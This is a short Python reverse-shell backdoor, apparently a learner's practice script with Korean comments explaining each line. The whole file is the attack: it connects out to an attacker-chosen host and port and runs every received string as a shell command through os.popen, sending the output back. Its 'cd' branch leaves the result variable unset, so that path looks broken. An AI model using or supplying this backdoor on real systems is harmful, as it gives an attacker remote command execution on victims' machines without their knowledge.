#클라이언트(백도어)
import os, socket, sys
import subprocess

def usage(): #help, 사용법^^
    print(''' 
          tcp_reverse_backdoor.py <hostIP> <port>''')
    exit() #프로그램 동작과 상관없음ㅋ
    
if len(sys.argv) < 3:
    usage()         #입력을 받을 때, 3개보다 작게 받으면 다시 입력받으라는 의미

with socket.socket() as s:
        addr = (sys.argv[1], int(sys.argv[2])) #port는 숫자로 가져와야 하기 때문에 int로 붙여줌
        s.connect(addr) #위에서 이미 선언되어 있음
        s.send('''
               #################
               conection solved
               >>'''.encode()) #server에게 보이는 문장
        #encode는 보낼 때 무조건 해 줘야 함. tcp형태로 보내지기 때문에
        #데이터를 주고 받는 부분
        while True:
            data = s.recv(1024).decode().lower() # data의 받아진 정보가 디코딩 되어 소문자로 들어옴
            if "q" == data:
                exit() #program 종료
            else:
                if data.startswith("cd"):
                    #cd가 하는 것은 디렉토리를 변경함 cd Desktop 이렇게 변경함
                    os.chdir(data[3:].replace('\n', '')) #cd는 os 디렉토리?에 존재함
                else:
                    result = os.popen(data).read()
                result = result + "\n>>"
                s.send(result.encode())  #result값이 server로 전송이 된다.
    